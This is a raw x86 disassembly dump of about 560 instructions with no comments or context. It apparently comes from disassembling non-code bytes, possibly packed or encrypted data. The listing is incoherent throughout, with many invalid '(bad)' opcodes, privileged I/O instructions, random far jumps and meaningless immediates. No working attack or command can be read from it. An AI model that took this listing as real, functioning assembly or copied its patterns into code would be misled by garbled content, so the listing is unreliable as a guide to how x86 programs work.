  41096d:	mov    ah,0x9b
  41096f:	mov    ds:0x1a31cb,eax
  410974:	call   FWORD PTR [ecx]
  410976:	adc    al,0xf9
  410978:	enter  0x2a5c,0xc
  41097c:	lock fwait
  41097e:	test   DWORD PTR [eax+0x2b],ebp
  410981:	addr16 adc eax,0x8d54594d
  410987:	mov    al,0xce
  410989:	and    DWORD PTR [ecx+0x647e9967],esp
  41098f:	mov    bl,0x84
  410991:	test   DWORD PTR [esi-0x77],0x8765e47b
  410998:	lock ins BYTE PTR es:[edi],dx
  41099a:	cli    
  41099b:	rcl    dh,cl
  41099d:	adc    al,0xe
  41099f:	inc    esi
  4109a0:	xor    BYTE PTR [ebx+0x6c],dl
  4109a3:	inc    ecx
  4109a4:	jnp    0x4109d9
  4109a6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4109a7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4109a8:	pop    ss
  4109a9:	repnz push eax
  4109ab:	dec    esi
  4109ac:	aaa    
  4109ad:	xchg   ebx,eax
  4109ae:	xchg   ebx,eax
  4109af:	arpl   WORD PTR [edx+0x1087c853],bx
  4109b5:	jmp    0x4cb5:0x4388420f
  4109bc:	jae    0x4109cc
  4109be:	das    
  4109bf:	in     al,0x49
  4109c1:	(bad)  
  4109c2:	mov    ebx,0x738b5dbb
  4109c7:	aam    0xab
  4109c9:	push   esi
  4109ca:	push   es
  4109cb:	and    ch,cl
  4109cd:	mov    ecx,0x38a799e9
  4109d2:	xchg   ebp,eax
  4109d3:	loop   0x4109b1
  4109d5:	pusha  
  4109d6:	and    DWORD PTR [ecx+eax*1-0x6f3de281],0x7f527857
  4109e1:	popw   es
  4109e3:	mov    bl,0xaf
  4109e5:	mul    ebx
  4109e7:	jno    0x410a30
  4109e9:	xlat   BYTE PTR ds:[ebx]
  4109ea:	scas   eax,DWORD PTR es:[edi]
  4109eb:	aad    0x54
  4109ed:	adc    esp,ecx
  4109ef:	sub    al,BYTE PTR [ecx+0x47fa1184]
  4109f5:	js     0x410a55
  4109f7:	jp     0x410a05
  4109f9:	inc    eax
  4109fa:	lds    eax,FWORD PTR [edx+0xee9b09b]
  410a00:	pop    edi
  410a01:	sbb    esi,DWORD PTR [ebp+0x1e]
  410a04:	sbb    bh,BYTE PTR [ebx-0x24]
  410a07:	and    eax,0xe29411c8
  410a0c:	in     al,dx
  410a0d:	(bad)  
  410a0e:	out    0xfc,eax
  410a10:	cld    
  410a11:	dec    ebx
  410a12:	adc    eax,0xb681e56e
  410a17:	push   0x36
  410a19:	xor    bl,cl
  410a1b:	mov    al,ds:0xdebe87ab
  410a20:	xor    BYTE PTR ds:0x6b5f85e,0x8f
  410a27:	xchg   DWORD PTR [eax+0x2d],ebx
  410a2a:	or     al,0xef
  410a2c:	pop    ds
  410a2d:	lahf   
  410a2e:	add    esp,DWORD PTR [ebx-0x4862750]
  410a34:	cmp    dh,bl
  410a36:	imul   ecx,DWORD PTR [edi-0x5cdd86ad],0x35227d26
  410a40:	pop    ebx
  410a41:	and    al,0x57
  410a43:	shl    BYTE PTR ds:0xd22d86cc,0x43
  410a4a:	js     0x410a3a
  410a4c:	xor    DWORD PTR [edi-0x11f31066],edx
  410a52:	jbe    0x410a5d
  410a54:	add    al,0xc4
  410a57:	shl    DWORD PTR ds:0xe500212b,cl
  410a5d:	mov    al,ds:0xbe0bc30d
  410a62:	fidiv  WORD PTR [esi+0x45]
  410a65:	pushf  
  410a66:	sbb    cl,BYTE PTR [edx]
  410a68:	pushf  
  410a69:	add    al,0x61
  410a6b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410a6c:	mov    al,0x68
  410a6e:	dec    ebp
  410a6f:	xchg   ebp,eax
  410a70:	outs   dx,BYTE PTR ds:[esi]
  410a71:	mov    ds:0xfbd60eb7,al
  410a76:	popa   
  410a77:	inc    ecx
  410a78:	pop    es
  410a79:	loope  0x410aec
  410a7b:	mov    ch,0x2c
  410a7d:	dec    ebp
  410a7e:	add    BYTE PTR [ecx+eax*2-0x4a],bh
  410a82:	fnstcw WORD PTR [edi-0x26371b31]
  410a88:	sub    BYTE PTR [ecx-0x20],bl
  410a8b:	mov    eax,ds:0xd633d3b8
  410a90:	jns    0x410aba
  410a92:	mov    BYTE PTR [edx+0x3a1b59a5],ch
  410a98:	mov    ebp,0xb0e4b36a
  410a9d:	jno    0x410b02
  410a9f:	xor    eax,0xb9a092a9
  410aa4:	pop    esp
  410aa5:	imul   esi,DWORD PTR [esi-0x45],0xfffffff2
  410aa9:	adc    edx,ecx
  410aab:	aad    0x6c
  410aad:	inc    eax
  410aae:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410aaf:	das    
  410ab0:	(bad)  
  410ab1:	ja     0x410b2b
  410ab3:	jecxz  0x410b29
  410ab5:	push   eax
  410ab6:	mov    ebx,0xe0c5d94f
  410abb:	pop    ecx
  410abc:	fwait
  410abd:	dec    ecx
  410abe:	fimul  DWORD PTR [ebx-0x28]
  410ac1:	jp     0x410a55
  410ac3:	mov    edi,0xba833bbe
  410ac8:	adc    al,0x50
  410aca:	or     ecx,edi
  410acc:	cmp    al,0x1b
  410ace:	stos   DWORD PTR es:[edi],eax
  410acf:	aaa    
  410ad0:	sbb    al,0xa4
  410ad2:	ret    0x5241
  410ad5:	xor    cl,BYTE PTR [ecx-0x3d290e9b]
  410adb:	pop    ecx
  410adc:	mov    esp,0x1b15305e
  410ae1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410ae2:	and    ebp,DWORD PTR [edx]
  410ae4:	xchg   ebp,eax
  410ae5:	adc    DWORD PTR [eax+eiz*4+0x4da6c5dc],ecx
  410aec:	jecxz  0x410a93
  410aee:	retf   0xc01a
  410af1:	leave  
  410af2:	imul   eax,DWORD PTR [ebp+0x44ab19d5],0x9fcaf504
  410afc:	inc    edx
  410afd:	cwde   
  410afe:	mov    eax,0xd19e4eb5
  410b03:	push   edx
  410b04:	jle    0x410b13
  410b06:	lds    esi,FWORD PTR [esi-0x60cc55f5]
  410b0c:	push   esi
  410b0d:	pop    ss
  410b0e:	cmp    eax,0xd9f69410
  410b13:	jge    0x410b26
  410b15:	fdiv   DWORD PTR [ecx+ebx*4]
  410b18:	push   0xf10e5007
  410b1d:	(bad)  
  410b1e:	out    dx,eax
  410b1f:	pop    eax
  410b20:	in     eax,0x31
  410b22:	cmp    al,0x79
  410b24:	aas    
  410b25:	dec    ebx
  410b26:	and    BYTE PTR fs:[ecx+0x19da097],al
  410b2d:	cmp    DWORD PTR [eax],esi
  410b2f:	sub    al,0x61
  410b31:	cmc    
  410b32:	mov    dl,0x3e
  410b34:	pop    eax
  410b35:	aam    0xcd
  410b37:	stos   BYTE PTR es:[edi],al
  410b38:	fldenv [esi]
  410b3a:	cmp    esp,DWORD PTR [eax]
  410b3c:	imul   eax,DWORD PTR [eax+0x3e],0xffffffe0
  410b40:	mov    edi,0x8baeaf0
  410b45:	fcom   QWORD PTR [ebx]
  410b47:	xchg   DWORD PTR [ebp-0x7],eax
  410b4a:	mov    gs,WORD PTR [edx-0x23f0e7f5]
  410b50:	pop    edx
  410b51:	cmp    esi,DWORD PTR [eax+ebx*8-0x41d881e0]
  410b58:	or     edi,DWORD PTR [edi-0x52]
  410b5b:	jmp    0x78f98a3c
  410b60:	(bad)  
  410b61:	outs   dx,DWORD PTR ds:[esi]
  410b62:	dec    ebp
  410b63:	xchg   ebx,eax
  410b64:	cwde   
  410b65:	adc    BYTE PTR [edi],bl
  410b67:	push   esp
  410b68:	fimul  DWORD PTR [edi+ebx*1+0x50]
  410b6c:	jp     0x410bd9
  410b6e:	fadd   st,st(0)
  410b70:	mov    ch,0x2a
  410b72:	mov    ecx,ds
  410b74:	dec    esi
  410b75:	fnstcw WORD PTR [ebx-0x5f]
  410b78:	cmp    BYTE PTR [edx+0x54],bl
  410b7b:	xchg   ecx,eax
  410b7c:	mov    ds:0xf7bfdb4f,eax
  410b81:	ins    BYTE PTR es:[edi],dx
  410b82:	and    DWORD PTR ds:0x12d2ccad,ebx
  410b88:	ror    ebp,1
  410b8a:	add    BYTE PTR [eax-0x10d64f86],0x5
  410b91:	dec    ebx
  410b92:	int3   
  410b93:	jnp    0x410b84
  410b95:	jp     0x410bab
  410b97:	jl     0x410b31
  410b99:	push   es
  410b9a:	mov    esp,0x503e8d5d
  410b9f:	(bad)  
  410ba1:	or     edi,DWORD PTR [esi]
  410ba3:	jmp    0x8085:0xbcd4a98c
  410baa:	mov    bl,0x93
  410bac:	imul   esp,edi,0x42d3ca5e
  410bb2:	fcom   QWORD PTR [eax+0x4c2d21a4]
  410bb8:	pop    edx
  410bb9:	add    DWORD PTR [edx+0x6efffe25],0x6e
  410bc0:	cmp    eax,0x63d9452e
  410bc5:	ins    DWORD PTR es:[edi],dx
  410bc6:	pushf  
  410bc7:	clc    
  410bc8:	jmp    0x410b9d
  410bca:	out    dx,al
  410bcb:	xor    DWORD PTR [esi+0x43],0x2b
  410bcf:	mov    ch,0xa6
  410bd1:	mov    ah,0x74
  410bd3:	lods   al,BYTE PTR ds:[esi]
  410bd4:	xlat   BYTE PTR ds:[ebx]
  410bd5:	gs xchg edi,eax
  410bd7:	jle    0x410bc1
  410bd9:	repz and eax,0x9199109e
  410bdf:	mov    ecx,0x508d398c
  410be4:	or     BYTE PTR [ecx-0xca745f5],dh
  410bea:	pushf  
  410beb:	dec    eax
  410bec:	je     0x410c55
  410bee:	repnz xor edi,DWORD PTR [edi+0x59]
  410bf2:	xlat   BYTE PTR ds:[ebx]
  410bf3:	xchg   edi,eax
  410bf4:	scas   eax,DWORD PTR es:[edi]
  410bf5:	js     0x410c3a
  410bf7:	pop    es
  410bf8:	xchg   ecx,eax
  410bf9:	push   ebx
  410bfa:	mov    dl,0xcc
  410bfc:	popa   
  410bfd:	push   ecx
  410bfe:	lock ins BYTE PTR es:[edi],dx
  410c00:	call   0xd285:0x2b551a6c
  410c07:	xchg   ecx,eax
  410c08:	test   DWORD PTR [esi+ebx*1],ebx
  410c0b:	xchg   edx,eax
  410c0c:	out    dx,al
  410c0d:	mov    esi,0x65076e11
  410c12:	cmp    al,BYTE PTR [edx]
  410c14:	xor    BYTE PTR [ebx-0x4586d811],ch
  410c1a:	inc    ebp
  410c1b:	out    dx,al
  410c1c:	push   edx
  410c1d:	test   DWORD PTR [edi+0x53440ea9],ebp
  410c23:	add    eax,0x9931fd2d
  410c28:	arpl   WORD PTR [esi+0x47f7eaee],cx
  410c2e:	sbb    edi,DWORD PTR [edx+0x79]
  410c31:	sub    DWORD PTR [edi+edx*2-0x5b],edx
  410c35:	push   ds
  410c36:	dec    esi
  410c37:	into   
  410c38:	xchg   esp,eax
  410c39:	or     dl,ah
  410c3b:	ins    DWORD PTR es:[edi],dx
  410c3c:	add    edx,DWORD PTR [ecx-0x5d3589db]
  410c42:	sahf   
  410c43:	xchg   edi,eax
  410c44:	sub    cl,BYTE PTR [ebx]
  410c46:	aaa    
  410c47:	sahf   
  410c48:	fdivp  st(5),st
  410c4a:	sub    al,0x4d
  410c4c:	clc    
  410c4d:	retf   
  410c4e:	ds ins BYTE PTR es:[edi],dx
  410c50:	fimul  WORD PTR [ecx]
  410c52:	push   0xfffffff9
  410c54:	sub    eax,0xc318e541
  410c59:	in     al,dx
  410c5a:	push   edi
  410c5b:	jno    0x410c90
  410c5d:	lahf   
  410c5e:	je     0x410cba
  410c60:	xchg   esi,eax
  410c61:	mov    cs,WORD PTR [ebx]
  410c63:	popa   
  410c64:	pop    esi
  410c65:	fdivr  DWORD PTR [eax*2-0x1be57f58]
  410c6c:	push   esi
  410c6d:	sbb    DWORD PTR [edi],eax
  410c6f:	hlt    
  410c70:	add    edi,edi
  410c72:	xchg   edi,eax
  410c73:	jmp    0x7b914671
  410c78:	fdivr  st,st(5)
  410c7a:	pop    ecx
  410c7b:	(bad)  
  410c7c:	cli    
  410c7d:	or     al,0x67
  410c7f:	cli    
  410c80:	fisubr DWORD PTR [ecx-0x437848d7]
  410c86:	add    al,BYTE PTR [ebx-0x73fabbd]
  410c8c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410c8d:	jno    0x410cbd
  410c8f:	xor    al,0x25
  410c91:	jne    0x410cad
  410c93:	push   ss
  410c94:	cwde   
  410c95:	push   ebx
  410c96:	mov    DWORD PTR [ecx+0x71],edi
  410c99:	xchg   ecx,eax
  410c9a:	scas   eax,DWORD PTR es:[edi]
  410c9b:	xchg   esi,eax
  410c9c:	adc    DWORD PTR [ecx],0x2e
  410c9f:	(bad)  
  410ca0:	mov    ah,0xa1
  410ca2:	sti    
  410ca3:	rcl    DWORD PTR [ebx-0x1a],1
  410ca6:	scas   eax,DWORD PTR es:[edi]
  410ca7:	mov    ebp,0x81cdce17
  410cac:	mov    ebx,0xfff78375
  410cb1:	pop    ds
  410cb2:	pop    es
  410cb3:	jno    0x410c65
  410cb5:	sub    al,0xd0
  410cb7:	mov    ds:0xe7b312d0,al
  410cbc:	mov    bh,0x97
  410cbe:	inc    ebx
  410cbf:	nop
  410cc0:	jae    0x410ce6
  410cc2:	xchg   esp,eax
  410cc3:	nop
  410cc4:	push   esi
  410cc5:	jge    0x410cfa
  410cc7:	outs   dx,BYTE PTR ds:[esi]
  410cc8:	xchg   ecx,eax
  410cc9:	add    ebp,DWORD PTR [edx+0x14]
  410ccc:	jmp    0x767247b5
  410cd1:	lahf   
  410cd2:	lea    edi,[ebp-0x309318db]
  410cd8:	std    
  410cd9:	or     eax,0x274e4c63
  410cde:	test   al,0x9e
  410ce0:	add    eax,0x55134b8
  410ce5:	fcomp  DWORD PTR [ecx]
  410ce7:	mov    ah,0x95
  410ce9:	fbstp  TBYTE PTR [eax-0x405897c2]
  410cef:	pop    ebx
  410cf0:	mov    esi,0x2c3d7a61
  410cf5:	pop    ebx
  410cf6:	inc    esp
  410cf7:	inc    eax
  410cf8:	aas    
  410cf9:	ret    
  410cfa:	inc    esp
  410cfb:	into   
  410cfc:	pop    esp
  410cfd:	inc    eax
  410cfe:	sahf   
  410cff:	pusha  
  410d00:	and    eax,0x60922cda
  410d05:	xor    eax,DWORD PTR [edx-0x7e88f9d5]
  410d0b:	jnp    0x410d3e
  410d0d:	mov    eax,0x9f5e77a
  410d12:	inc    edx
  410d13:	sub    DWORD PTR [esi+0x2b],ecx
  410d16:	ret    0x68d3
  410d19:	fld    QWORD PTR [eax]
  410d1b:	mov    ah,0x45
  410d1d:	lods   al,BYTE PTR ds:[esi]
  410d1e:	int    0x2d
  410d20:	icebp  
  410d21:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410d22:	add    BYTE PTR [edx+0x43],bh
  410d25:	adc    al,0xf3
  410d27:	cmp    BYTE PTR [edx],0x27
  410d2a:	add    DWORD PTR [esi-0x1d],esi
  410d2d:	mov    esi,0xb1db132b
  410d32:	imul   ecx,DWORD PTR [eax],0x55
  410d35:	push   ecx
  410d36:	call   0xe38f771
  410d3b:	mov    esp,0x1c400f50
  410d40:	aas    
  410d41:	dec    esp
  410d42:	cmp    DWORD PTR [eax+0x44],esi
  410d45:	jbe    0x410db0
  410d47:	dec    ecx
  410d48:	ins    BYTE PTR es:[edi],dx
  410d49:	popa   
  410d4a:	scas   al,BYTE PTR es:[edi]
  410d4b:	ss test eax,0xa2dac7e5
  410d51:	pop    ebp
  410d52:	xchg   DWORD PTR [ebx+0x7c303b70],eax
  410d58:	sub    al,0x3a
  410d5a:	lods   al,BYTE PTR ds:[esi]
  410d5b:	into   
  410d5c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410d5d:	cli    
  410d5e:	ins    BYTE PTR es:[edi],dx
  410d5f:	data16 ja 0x410d8e
  410d62:	cwde   
  410d63:	pop    edx
  410d64:	sub    ecx,DWORD PTR ss:[ecx+ebx*1]
  410d68:	int    0x4c
  410d6a:	ss mov ebx,0x15912a53
  410d70:	mov    edi,0x352b641b
  410d75:	xchg   ecx,eax
  410d76:	pop    ss
  410d77:	adc    ah,0xe5
  410d7a:	push   ebp
  410d7b:	ins    BYTE PTR es:[edi],dx
  410d7c:	sub    al,0x87
  410d7e:	adc    eax,0xee5f3227
  410d83:	cmp    bh,BYTE PTR [esi+0xea4e168]
  410d89:	add    esi,DWORD PTR [ecx+0x2c6ef66a]
  410d8f:	sub    dl,BYTE PTR [edi]
  410d91:	shr    DWORD PTR [eax],cl
  410d93:	pop    edx
  410d94:	(bad)  
  410d95:	sbb    ecx,DWORD PTR [edx-0x525b7afc]
  410d9b:	daa    
  410d9c:	jnp    0x410dac
  410d9e:	ss xchg ecx,eax
  410da0:	cwde   
  410da1:	mov    edi,0x78fbeec5
  410da6:	ins    DWORD PTR es:[edi],dx
  410da7:	jmp    0x410d5d
  410da9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410daa:	sbb    BYTE PTR [ebx],0xd8
  410dad:	mov    gs,WORD PTR [eax]
  410daf:	out    dx,eax
  410db0:	ret    
  410db1:	fist   WORD PTR [ebp*4-0x2245e964]
  410db8:	cwde   
  410db9:	es iret 
  410dbb:	add    al,0x12
  410dbd:	sbb    al,0x28
  410dbf:	sahf   
  410dc0:	es enter 0x2e54,0xb
  410dc5:	mov    ch,0xa2
  410dc7:	mov    ebx,edx
  410dc9:	xchg   esi,eax
  410dca:	mov    ecx,0x917c7148
  410dcf:	push   eax
  410dd0:	mov    bh,0x7
  410dd2:	loope  0x410e50
  410dd4:	loop   0x410e31
  410dd6:	inc    edi
  410dd7:	in     eax,0x79
  410dd9:	or     al,0xa5
  410ddb:	ret    
  410ddc:	or     esp,DWORD PTR [eax-0x54]
  410ddf:	ins    DWORD PTR es:[edi],dx
  410de0:	sbb    eax,esp
  410de2:	repnz rep outs dx,DWORD PTR ds:[esi]
  410de5:	rol    dl,1
  410de7:	test   BYTE PTR [esi-0x3aecbec2],al
  410ded:	shl    esp,cl
  410def:	shr    BYTE PTR [eax],0x4
  410df2:	imul   ebx,DWORD PTR [eax+0x4528713b],0x6d
  410df9:	jns    0x410d86
  410dfb:	lds    esi,FWORD PTR [edi]
  410dfd:	outs   dx,BYTE PTR ds:[esi]
  410dfe:	or     al,0x22
  410e00:	mov    ebp,0xc89ec7da
  410e05:	or     DWORD PTR [bx-0x7fc9],ebx
  410e0a:	push   0xa88d08b5
  410e0f:	repz dec eax
  410e11:	and    bh,BYTE PTR [ebx-0x42785870]
  410e17:	inc    ecx
  410e18:	push   esp
  410e19:	xchg   edi,eax
  410e1a:	adc    BYTE PTR [ebp+0x6bf5eb29],0x8e
  410e21:	les    ecx,FWORD PTR [ecx-0x55]
  410e24:	retf   0x6105
  410e27:	sahf   
  410e28:	inc    edx
  410e29:	push   es
  410e2a:	mov    dl,0x2f
  410e2c:	int3   
  410e2d:	dec    edx
  410e2e:	cmp    DWORD PTR ds:0xdcf2c585,eax
  410e34:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410e35:	addr16 cmp dl,al
  410e38:	int    0x22
  410e3a:	fadd   QWORD PTR [edx+0x728967dd]
  410e40:	xchg   esp,eax
  410e41:	cmp    DWORD PTR [edx+ebp*8+0x23],esi
  410e45:	mov    BYTE PTR [eax],dh
  410e47:	xor    BYTE PTR [ebp+0x4dc1a80f],ch
  410e4d:	jl     0x410def
  410e4f:	add    DWORD PTR [ebp-0x60],ebp
  410e52:	xor    eax,0xd0d8e1c7
  410e57:	retf   0x666b
  410e5a:	std    
  410e5b:	cld    
  410e5c:	pop    edx
  410e5d:	mov    esp,0x86c805ba
  410e62:	aas    
  410e63:	inc    esi
  410e64:	or     edi,DWORD PTR [ebp-0x67]
  410e67:	fmul   QWORD PTR [eax]
  410e69:	pop    ss
  410e6a:	rcl    DWORD PTR [ecx+ebx*1],1
  410e6d:	fiadd  DWORD PTR [ecx]
  410e6f:	jne    0x410e6d
  410e71:	xor    al,0xe2
  410e73:	and    eax,DWORD PTR [ebp+ebp*1+0x4bc4ace1]
  410e7a:	sbb    al,0xec
  410e7c:	imul   esp
  410e7e:	stos   DWORD PTR es:[edi],eax
  410e7f:	js     0x410edc
  410e81:	nop
  410e82:	xchg   esp,eax
  410e83:	nop
  410e84:	clc    
  410e85:	int3   
  410e86:	stos   BYTE PTR es:[edi],al
  410e87:	mov    ebp,esi
  410e89:	jmp    0x898d3d0c
  410e8e:	jmp    0x410e8d
  410e90:	leave  
  410e91:	jl     0x410ea8
  410e93:	xchg   esi,esi
  410e95:	(bad)  
  410e96:	ins    BYTE PTR es:[edi],dx
  410e97:	dec    esi
  410e98:	jnp    0x410e4f
  410e9a:	fs pop ebp
  410e9c:	lea    ebx,[edi+edx*8-0x4d]
  410ea0:	push   es
  410ea1:	and    ebp,DWORD PTR [edx]
  410ea3:	mov    WORD PTR [esp+edi*1],?
  410ea6:	xchg   ecx,eax
  410ea7:	or     BYTE PTR [ecx-0x42],cl
  410eaa:	rol    BYTE PTR [ecx+0x2d9689b0],cl
  410eb0:	imul   ebx,DWORD PTR [edx],0x22f500ea
  410eb6:	dec    edi
  410eb7:	xor    eax,0x4078455a
  410ebc:	ins    DWORD PTR es:[edi],dx
  410ebd:	scas   eax,DWORD PTR es:[edi]
  410ebe:	jbe    0x410f02
  410ec0:	test   al,0x36
  410ec2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410ec3:	inc    ecx
  410ec4:	cmc    
  410ec5:	(bad)  
  410ec6:	cmp    cl,ch
  410ec8:	or     BYTE PTR [edi+ecx*1-0xcac20a7],bh
  410ecf:	fcomp  QWORD PTR ds:0x2eacdf13
  410ed5:	outs   dx,DWORD PTR ds:[esi]
  410ed6:	mov    ch,0xa1
  410ed8:	mov    DWORD PTR [ecx+0x395c0024],eax
  410ede:	aaa    
  410edf:	adc    edi,esp
  410ee1:	add    ebx,DWORD PTR [edx-0x47362f4d]
  410ee7:	add    DWORD PTR [ebp-0x592834b1],esp
  410eed:	(bad)  
  410eee:	ss jmp 0x94c2:0xe416760d
  410ef6:	jno    0x410ee9
  410ef8:	sbb    eax,0xfdc01c90
  410efd:	mov    eax,ds:0x2da0709f
  410f02:	add    ah,BYTE PTR [esi]
  410f04:	pop    ss
  410f05:	push   ebx
  410f06:	(bad)  
  410f07:	in     eax,0x57
  410f09:	dec    edi
  410f0a:	ja     0x410f18
  410f0c:	sub    BYTE PTR [esi],0x66
  410f0f:	outs   dx,DWORD PTR ds:[esi]
  410f10:	into   
  410f11:	fwait
  410f12:	jnp    0x410ef9
  410f14:	jnp    0x410f2d
  410f16:	sahf   
  410f17:	mov    es,WORD PTR [ebx-0x1db69ff0]
  410f1d:	mov    ah,0x95
  410f1f:	pop    edx
  410f20:	mov    eax,ds:0x342d1c94
  410f25:	dec    ebx
  410f26:	loopne 0x410f9b
  410f28:	int    0x18
  410f2a:	fisubr WORD PTR [edx+0x79]
  410f2d:	dec    edi
  410f2e:	cld    
  410f2f:	mov    esp,0x7c901712
  410f34:	sar    DWORD PTR [edx+0x7],cl
  410f37:	jmp    0xfe7b6a4f
  410f3c:	and    DWORD PTR [ebx+edx*1],edi
  410f3f:	add    eax,0xe5b22468
  410f44:	xor    BYTE PTR [edi+0x10],bl
  410f47:	gs sahf 
  410f49:	fist   DWORD PTR [eax]
  410f4b:	sbb    eax,0xc6955b8
  410f50:	loope  0x410f94
  410f52:	in     eax,0x5a
  410f54:	sub    edi,0x865dba7e
  410f5a:	jns    0x410f62
  410f5c:	faddp  st(3),st
  410f5e:	pop    ebx
  410f5f:	xor    ebx,edi
  410f61:	mov    eax,ds:0x6e15d7d7
  410f66:	pop    esp
  410f67:	cli    
  410f68:	pusha  
  410f69:	shl    DWORD PTR [esp+eiz*4],0x3b
  410f6d:	enter  0xb499,0xa9
  410f71:	push   es
  410f72:	xor    al,0x2e
  410f74:	xchg   ebp,eax
  410f75:	mov    cl,0xd4
  410f77:	sub    BYTE PTR [edi+0x48],cl
  410f7a:	push   esi
  410f7b:	sub    al,BYTE PTR [esi-0x3200206]
  410f81:	adc    bl,BYTE PTR [edi]
  410f83:	mov    bl,0x3d
  410f85:	push   esi
  410f86:	xchg   DWORD PTR [edx+edx*4+0x4cdefae4],esp
  410f8d:	test   eax,0x47c2f124
  410f92:	xchg   edi,eax
  410f93:	mov    ah,0xfa
  410f95:	or     BYTE PTR [ecx],ch
  410f97:	add    ebx,DWORD PTR [eax-0x18cd1508]
  410f9d:	fisttp WORD PTR [ebx-0xee2e58b]
  410fa3:	or     al,0xa9
  410fa5:	les    esi,FWORD PTR [ecx-0x4204e6]
  410fab:	push   eax
  410fac:	je     0x41100c
  410fae:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410faf:	cdq    
  410fb0:	cmp    dl,BYTE PTR [ebx-0x79dd8b]
  410fb6:	jmp    0x3930:0xcfa2ebfe
  410fbd:	dec    eax
  410fbe:	mov    cl,BYTE PTR [esi]
  410fc0:	cmp    al,0x7c
  410fc2:	shl    BYTE PTR es:[ecx],1
  410fc5:	dec    eax
  410fc6:	jp     0x410f6d
  410fc8:	in     al,dx
  410fc9:	cmp    dh,BYTE PTR [edx+0x78]
  410fcc:	push   esp
  410fcd:	add    DWORD PTR [esi+0x3aceada0],0x448940d6
  410fd7:	jmp    0x410f84
  410fd9:	repz and DWORD PTR [eax+ebp*1+0x3f],ebp
  410fde:	fbld   TBYTE PTR [esi+0x3a]
  410fe1:	dec    eax
  410fe2:	or     BYTE PTR ds:0x286f4ceb,dl
  410fe8:	or     al,0x88
  410fea:	and    al,0x78
  410fec:	jg     0x411056
  410fee:	bound  ebp,QWORD PTR [edx+0x9]
  410ff1:	add    eax,0x3e8ad16e
  410ff6:	cmp    BYTE PTR [edi],bh
  410ff8:	clc    
  410ff9:	sbb    eax,0x98b109d6
  410ffe:	mov    cs,WORD PTR [eax-0x563306fe]
  411004:	mov    cs,WORD PTR [esi]
  411006:	jmp    0x1ecf3749
  41100b:	pop    ds
  41100c:	mov    tr1,ebx
  41100f:	aaa    
  411010:	mov    eax,ds:0x9989fc7d
  411015:	mov    ah,0x3c
  411017:	dec    edx
  411018:	dec    edi
  411019:	sbb    eax,0x428c3d0e
  41101e:	fadd   DWORD PTR [edi]
  411020:	(bad)  
  411022:	out    dx,eax
  411023:	cmp    BYTE PTR [ebp-0x32],0xe
  411027:	addr16 sahf 
  411029:	mov    ch,0x27
  41102b:	hlt    
  41102c:	icebp  
  41102d:	mov    WORD PTR [ecx],ds
  41102f:	pushf  
  411030:	and    BYTE PTR [eax+ecx*8-0x16],0x29
  411035:	inc    ecx
  411036:	sbb    BYTE PTR [ebp-0x3320ad8],ah
  41103c:	push   eax
  41103d:	jecxz  0x411018
  41103f:	jb     0x410ff6
  411041:	aad    0x60
  411043:	xchg   edx,eax
  411044:	ret    0x33a6
  411047:	and    DWORD PTR [edi+0x4b],eax
  41104a:	aam    0xde
  41104c:	push   0x9
  41104e:	mov    bl,0xba
  411050:	push   ss
  411051:	jo     0x4110a6
  411053:	pop    edx
  411054:	imul   ebp,DWORD PTR [esi-0x4c],0xd33cc56c
  41105b:	add    al,0x32
  41105d:	add    al,0x3
  41105f:	cmp    eax,0xe3189a76
  411064:	add    edx,ebp
  411066:	mov    DWORD PTR [ecx],eax
  411068:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411069:	pop    edi
  41106a:	inc    esi
  41106b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41106c:	inc    DWORD PTR [ebx+0x4b]
  41106f:	test   al,0x5a
  411071:	cmp    al,0xfd
  411073:	pop    ebx
  411074:	mov    cs,WORD PTR [bx+0x7c]
  411078:	out    dx,al
  411079:	leave  
  41107a:	(bad)  
  41107b:	jo     0x411027
  41107d:	fs xchg esi,eax
  41107f:	or     BYTE PTR [ebx-0x64cf4d32],bl
  411085:	adc    DWORD PTR [esp+eax*4+0x51],esi
  411089:	xchg   ebp,eax
  41108a:	mov    eax,0xe534ddfc
  41108f:	ss jmp 0xa99a:0xf771c577
  411097:	fcomp  st(6)
  411099:	arpl   ax,bp
  41109b:	dec    edx
  41109c:	rcr    BYTE PTR [edx],0x2
  41109f:	cwde   
  4110a0:	fisubr DWORD PTR [ebx+0x63a780e8]
  4110a6:	imul   ebx,DWORD PTR [ebx+0x63],0xffffff97
  4110aa:	lds    ecx,FWORD PTR [ebx+ebp*1-0x753c13cd]
  4110b1:	pop    edx
  4110b2:	(bad)  
  4110b3:	loopne 0x4110b2
  4110b5:	ins    DWORD PTR es:[edi],dx
  4110b6:	push   eax
  4110b7:	and    cl,ah
  4110b9:	sbb    ebp,DWORD PTR [edi]
  4110bb:	in     eax,0x1c
  4110bd:	pop    ds
  4110be:	inc    ecx
  4110bf:	pop    eax
  4110c0:	out    dx,eax
  4110c1:	in     al,dx
  4110c2:	push   edi
  4110c3:	ror    BYTE PTR [edi-0x78],cl
  4110c6:	arpl   WORD PTR [ecx+0x1],cx
  4110c9:	cdq    
  4110ca:	or     ah,BYTE PTR [eax-0x39]
  4110cd:	jns    0x4110b1
  4110cf:	mov    ecx,0x8556e3ba
  4110d4:	popf   
  4110d5:	and    eax,0xda9452aa
  4110da:	sub    dl,bl
  4110dc:	fxch   st(7)
  4110de:	imul   ebp,DWORD PTR [edi-0xa7a73cb],0x47cc6372
  4110e8:	cmp    DWORD PTR [ecx],ecx
  4110ea:	or     BYTE PTR [edi],dl
  4110ec:	clc    
  4110ed:	adc    al,0x5b
  4110ef:	jae    0x411091
  4110f1:	and    eax,0xd875a983
  4110f6:	repnz pop ebp
  4110f8:	pop    ds
  4110f9:	loop   0x41107d
  4110fb:	add    ecx,esi
  4110fd:	cmp    al,0x17
  4110ff:	add    eax,0xf44267ce
